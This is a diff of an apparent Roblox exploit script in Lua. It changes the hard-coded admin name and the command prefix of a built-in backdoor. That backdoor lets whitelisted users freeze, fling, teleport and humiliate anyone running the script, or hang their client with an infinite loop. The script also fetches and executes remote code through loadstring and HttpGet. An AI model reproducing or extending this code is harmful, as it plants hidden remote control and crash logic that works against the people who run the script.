@@ -730,7 +730,7 @@ end)
 -------------------------------------------------------------------------------------------------------------------------------------------------
 
 local swagmins = {
-  3098428016, -- Unbotdesofia2
+  3098428016, -- Mas2n
 }
 
 local bending = false
@@ -743,13 +743,13 @@ local function commands(msg,plr)
         local Lower = string.lower(player.Name)
         local Allowed = string.find(Lower, SplitCMD[2])
         if Allowed then
-            if string.find(SplitCMD[1], ',freeze') then
+            if string.find(SplitCMD[1], ':freeze') then
                 player.Character.HumanoidRootPart.Anchored = true
             end
-            if string.find(SplitCMD[1], ',thaw') then
+            if string.find(SplitCMD[1], ':thaw') then
                 player.Character.HumanoidRootPart.Anchored = false
             end
-            if string.find(SplitCMD[1], ',benx') then
+            if string.find(SplitCMD[1], ':benx') then
                 bending = true
                 local segtarget = Mod.Name
                 local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
@@ -794,13 +794,13 @@ local function commands(msg,plr)
                 repeat wait() until bending == false
                 Pause()
             end
-            if string.find(SplitCMD[1], ',unbenx') then
+            if string.find(SplitCMD[1], ':unbenx') then
                 while bending == true do
                     wait()
                     bending = false
                 end
             end
-            if string.find(SplitCMD[1], ',kick') then
+            if string.find(SplitCMD[1], ':kick') then
                 local ISADMIN = table.find(swagmins, player.UserId)
                 if not ISADMIN then
                     kickmsg = Mod.Name
@@ -809,10 +809,10 @@ local function commands(msg,plr)
                     while true do end
                 end
             end
-            if string.find(SplitCMD[1], ',bring') then
+            if string.find(SplitCMD[1], ':bring') then
                 player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
             end
-            if string.find(SplitCMD[1], ',cuffban') then
+            if string.find(SplitCMD[1], ':cuffban') then
                 if table.find(swagmins, plr) then
                     local ISADMIN = table.find(swagmins, player.UserId)
                     if not ISADMIN then
@@ -820,11 +820,11 @@ local function commands(msg,plr)
                     end
                 end
             end
-            if string.find(SplitCMD[1], ',fling') then
+            if string.find(SplitCMD[1], ':fling') then
                 player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
             end
         else
-            if string.find(msg, '/e find') then
+            if string.find(msg, '/e test') then
                 game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
             end
         end
@@ -834,7 +834,7 @@ end
 muted = {}
 mutingnew = false 
 
-local ModCheck = loadstring(game:HttpGet("https://raw.githubusercontent.com/SrGask/Script-Lib/main/WhiteList2"))()
+local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/SrGask/Script-Lib/main/WhiteList2'))()
 Players.PlayerAdded:Connect(function(plr)
     local SWAGMIN = table.find(swagmins, plr.UserId)
     if SWAGMIN or ModCheck[plr.UserId] then
